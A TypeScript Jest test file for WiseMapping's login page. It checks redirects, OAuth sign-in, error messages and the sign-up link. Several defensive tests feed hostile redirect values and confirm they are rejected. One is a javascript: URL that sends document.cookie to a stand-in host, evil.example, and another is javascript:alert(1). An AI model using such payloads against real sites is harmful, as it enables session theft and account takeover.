/*
 *    Copyright [2007-2025] [wisemapping]
 *
 *   Licensed under WiseMapping Public License, Version 1.0 (the "License").
 *   It is basically the Apache License, Version 2.0 (the "License") plus the
 *   "powered by wisemapping" text requirement on every single page;
 *   you may not use this file except in compliance with the License.
 *   You may obtain a copy of the license at
 *
 *       https://github.com/wisemapping/wisemapping-open-source/blob/main/LICENSE.md
 *
 *   Unless required by applicable law or agreed to in writing, software
 *   distributed under the License is distributed on an "AS IS" BASIS,
 *   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *   See the License for the specific language governing permissions and
 *   limitations under the License.
 */

import React from 'react';
import { fireEvent, screen, waitFor } from '@testing-library/react';

jest.mock('react-router', () => jest.requireActual('../router-mock'));
jest.mock('../../../../src/components/seo', () => ({ SEOHead: () => null }));
jest.mock('../../../../src/utils/analytics', () => ({ trackPageView: jest.fn() }));
jest.mock('../../../../src/utils/redirect', () => ({
  ...jest.requireActual('../../../../src/utils/redirect'),
  leaveTo: jest.fn(),
}));

import LoginPage from '../../../../src/components/login-page';
import Client from '../../../../src/classes/client';
import { trackPageView } from '../../../../src/utils/analytics';
import { leaveTo } from '../../../../src/utils/redirect';
import { startOAuthFlow, takeOAuthFlow } from '../../../../src/utils/oauth-flow';
import { appLogger } from '../../../../src/utils/logger';
import { BURST_TEXT, typeInBurst } from '../../burst-typing';
import { initAppConfig, installMatchMedia, renderPage, useConfig } from '../helpers';
import { resetRouter, setLocation } from '../router-mock';

const setup = (url = '/c/login', signedIn = false) => {
  setLocation(url);
  const client = {
    fetchAccountInfo: jest.fn(() =>
      signedIn
        ? Promise.resolve({ email: 'ana@wisemapping.com' })
        : Promise.reject({ status: 401 }),
    ),
    login: jest.fn<Promise<void>, [unknown]>(() => Promise.resolve()),
  };
  renderPage(<LoginPage />, client as unknown as Client);
  return client;
};

const fillAndSubmit = async (email: string, password: string): Promise<void> => {
  fireEvent.change(await screen.findByLabelText(/^Email/), { target: { value: email } });
  fireEvent.change(screen.getByLabelText(/^Password/), { target: { value: password } });
  fireEvent.click(screen.getByRole('button', { name: 'Sign In' }));
};

describe('LoginPage', () => {
  beforeAll(async () => {
    await initAppConfig();
  });

  beforeEach(() => {
    resetRouter();
    installMatchMedia(false);
    localStorage.clear();
    sessionStorage.clear();
    jest.mocked(trackPageView).mockClear();
    jest.mocked(leaveTo).mockClear();
  });

  test('a signed-in user goes to the page in redirect', async () => {
    setup('/c/login?redirect=%2Fc%2Fmaps%2F3%2Fedit', true);
    await waitFor(() => expect(leaveTo).toHaveBeenCalledWith('/c/maps/3/edit'));
  });

  test.each([
    ['javascript:fetch(%22//evil.example?%22%2Bdocument.cookie)'],
    ['https%3A%2F%2Fevil.example%2F'],
    ['%2F%2Fevil.example'],
  ])('a signed-in user is not sent to redirect=%s', async (redirect) => {
    setup(`/c/login?redirect=${redirect}`, true);
    await waitFor(() => expect(leaveTo).toHaveBeenCalledWith('/c/maps/'));
  });

  test('a sign-in that came back with an error forgets its mark', async () => {
    startOAuthFlow('https://accounts.example.com/auth');
    setup('/c/login?error=oauth_failed');

    await screen.findByRole('form', { name: 'Login form' });
    expect(takeOAuthFlow()).toBeUndefined();
  });

  test('after signing in, an unsafe redirect goes to the map list instead', async () => {
    setup('/c/login?redirect=javascript:alert(1)');

    await fillAndSubmit('ana@wisemapping.com', 'secret');

    await waitFor(() => expect(leaveTo).toHaveBeenCalledWith('/c/maps/'));
  });

  test('after signing in, a safe redirect is followed', async () => {
    setup('/c/login?redirect=%2Fc%2Fmaps%2F9%2Fedit');

    await fillAndSubmit('ana@wisemapping.com', 'secret');

    await waitFor(() => expect(leaveTo).toHaveBeenCalledWith('/c/maps/9/edit'));
  });

  test('a signed-in user is redirected instead of seeing the form', async () => {
    const client = setup('/c/login', true);

    expect(screen.getByText('Redirecting...')).toBeTruthy();
    await waitFor(() => expect(client.fetchAccountInfo).toHaveBeenCalled());
    await new Promise((resolve) => setTimeout(resolve, 0));
    expect(screen.queryByRole('form', { name: 'Login form' })).toBeNull();
  });

  test('shows the login form when there is no session', async () => {
    setup();

    expect(await screen.findByRole('form', { name: 'Login form' })).toBeTruthy();
    expect(screen.getByText('Welcome')).toBeTruthy();
    expect(screen.getByRole('link', { name: 'Forgot Password ?' }).getAttribute('href')).toBe(
      '/c/forgot-password',
    );
    expect(document.title).toBe('Login | WiseMapping');
    expect(trackPageView).toHaveBeenCalledWith('/c/login', 'Login');
  });

  test('submits the typed credentials and applies the system theme', async () => {
    installMatchMedia(true);
    const client = setup();

    await fillAndSubmit('ana@wisemapping.com', 'secret-pass');

    await waitFor(() =>
      expect(client.login).toHaveBeenCalledWith({
        email: 'ana@wisemapping.com',
        password: 'secret-pass',
      }),
    );
    await waitFor(() => expect(localStorage.getItem('themeMode')).toBe('dark'));
  });

  test('takes 200 characters typed in one burst, as Cypress types them', async () => {
    const client = setup();
    const email = (await screen.findByLabelText(/^Email/)) as HTMLInputElement;
    const password = screen.getByLabelText(/^Password/) as HTMLInputElement;

    expect(await typeInBurst(email, `${BURST_TEXT}@wisemapping.com`)).toEqual([]);
    expect(await typeInBurst(password)).toEqual([]);
    fireEvent.click(screen.getByRole('button', { name: 'Sign In' }));

    await waitFor(() =>
      expect(client.login).toHaveBeenCalledWith({ email: email.value, password: password.value }),
    );
  });

  test('shows the server message when the login fails', async () => {
    const client = setup();
    client.login.mockRejectedValue({ msg: 'Account is not activated', code: 2 });

    await fillAndSubmit('ana@wisemapping.com', 'secret-pass');

    expect(await screen.findByText('Account is not activated')).toBeTruthy();
  });

  test('falls back to a generic message when the server gives none', async () => {
    const client = setup();
    client.login.mockRejectedValue({ code: 1 });

    await fillAndSubmit('ana@wisemapping.com', 'wrong');

    expect(
      await screen.findByText('The email address or password you entered is not valid.'),
    ).toBeTruthy();
  });

  test('explains that a map was shared when coming from a shared link', async () => {
    setup('/c/login?redirect=%2Fc%2Fmaps%2F3%2Fedit%3Fshared%3Dtrue');

    expect(await screen.findByText(/A mind map has been shared with you/)).toBeTruthy();
  });

  test.each([
    [
      'oauth_failed',
      'OAuth authentication failed. Please try again or use a different sign-in method.',
    ],
    ['server_error', 'An unexpected error occurred. Please try again later.'],
    ['other', 'An error occurred during authentication. Please try again.'],
  ])('explains the OAuth error "%s"', async (code, message) => {
    setup(`/c/login?error=${code}`);
    expect(await screen.findByText(message)).toBeTruthy();
  });

  test('offers sign-up in the header only while registration is open', async () => {
    useConfig({ registrationEnabled: true });
    setup();
    expect((await screen.findAllByRole('link', { name: 'Sign Up' }))[0].getAttribute('href')).toBe(
      '/c/registration',
    );
  });

  test('no sign-up link when registration is closed', async () => {
    useConfig({ registrationEnabled: false });
    setup();
    await screen.findByRole('form', { name: 'Login form' });
    expect(screen.queryByRole('link', { name: 'Sign Up' })).toBeNull();
  });

  test('without OAuth providers there are no social buttons', async () => {
    setup();
    await screen.findByRole('form', { name: 'Login form' });
    expect(screen.queryByRole('button', { name: 'Sign in with Google' })).toBeNull();
    expect(screen.queryByRole('button', { name: 'Sign in with Facebook' })).toBeNull();
  });

  test('the social buttons send the user to the provider', async () => {
    useConfig({
      googleOauth2Enabled: true,
      googleOauth2Url: 'https://accounts.example.com/auth',
      facebookOauth2Enabled: true,
      facebookOauth2Url: 'https://facebook.example.com/auth',
    });
    const log = jest.spyOn(appLogger, 'warn').mockImplementation(() => undefined);
    setup('/c/login?redirect=%2Fc%2Fmaps%2F3');

    fireEvent.click(await screen.findByRole('button', { name: 'Sign in with Google' }));
    fireEvent.click(screen.getByRole('button', { name: 'Sign in with Facebook' }));

    // A configured provider is navigated to, not reported as missing.
    expect(log).not.toHaveBeenCalled();
    expect(leaveTo).toHaveBeenCalledWith('https://accounts.example.com/auth?state=%2Fc%2Fmaps%2F3');
    expect(leaveTo).toHaveBeenCalledWith('https://facebook.example.com/auth?state=%2Fc%2Fmaps%2F3');
    // The callback can tell that the sign-in was started here.
    expect(takeOAuthFlow()).toMatchObject({ redirect: '/c/maps/3' });
  });

  test('a provider without a URL is reported and not navigated to', async () => {
    useConfig({ googleOauth2Enabled: true, googleOauth2Url: undefined });
    const log = jest.spyOn(appLogger, 'warn').mockImplementation(() => undefined);
    setup();

    fireEvent.click(await screen.findByRole('button', { name: 'Sign in with Google' }));

    expect(log).toHaveBeenCalledWith('Google OAuth URL is not configured.');
    expect(screen.queryByRole('button', { name: 'Sign in with Facebook' })).toBeNull();
  });
});
